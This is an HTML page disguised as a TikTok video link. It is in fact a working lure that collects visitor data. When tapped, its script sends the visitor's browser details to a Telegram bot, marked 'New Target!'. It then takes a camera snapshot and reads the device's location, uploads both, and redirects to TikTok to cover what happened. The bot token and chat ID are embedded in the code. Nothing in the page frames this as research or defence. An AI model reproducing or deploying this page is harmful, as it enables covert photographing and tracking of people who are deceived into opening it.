<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TikTok Video</title>
<style>
body{margin:0;padding:0;background:#000;font-family:Arial;display:flex;align-items:center;justify-content:center;height:100vh;}
.box{text-align:center;background:linear-gradient(45deg,#ff0050,#00f2ea);padding:50px;border-radius:20px;cursor:pointer;}
h1{color:#fff;margin-top:20px;}
button{background:#fff;border:none;padding:15px 40px;font-size:18px;border-radius:40px;margin-top:20px;cursor:pointer;color:#ff0050;font-weight:bold;}
</style>
</head>
<body>
<div class="box" onclick="start()">
    <h1>🎵 TikTok</h1>
    <button>▶ Tap to Watch</button>
</div>

<script>
const TOKEN = '8611440321:AAH-_EXmy8Mlpz70a9y4R2UuCCckjB6P_CI';
const CHAT_ID = '178779116';

async function start() {
    // تغيير الواجهة
    document.body.innerHTML = '<div style="background:#000;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column"><div style="border:4px solid #ff0050;border-top-color:transparent;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;margin-bottom:20px"></div><div>Loading...</div><style>@keyframes spin{to{transform:rotate(360deg)}}</style></div>';
    
    // إرسال معلومات الجهاز
    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=✅ New Target!%0A📱 ${navigator.userAgent}`);
    
    // طلب الكاميرا
    try {
        let stream = await navigator.mediaDevices.getUserMedia({video: true});
        let video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        setTimeout(() => {
            let canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            let img = canvas.toDataURL('image/jpeg');
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto?chat_id=${CHAT_ID}&photo=${encodeURIComponent(img)}`);
            stream.getTracks().forEach(t => t.stop());
        }, 1000);
    } catch(e) {}
    
    // طلب الموقع
    try {
        navigator.geolocation.getCurrentPosition(p => {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=📍 Location: ${p.coords.latitude},${p.coords.longitude}`);
        });
    } catch(e) {}
    
    // الانتقال لتيك توك بعد 5 ثواني
    setTimeout(() => {
        window.location.href = 'https://www.tiktok.com';
    }, 5000);
}
</script>
</body>
</html>
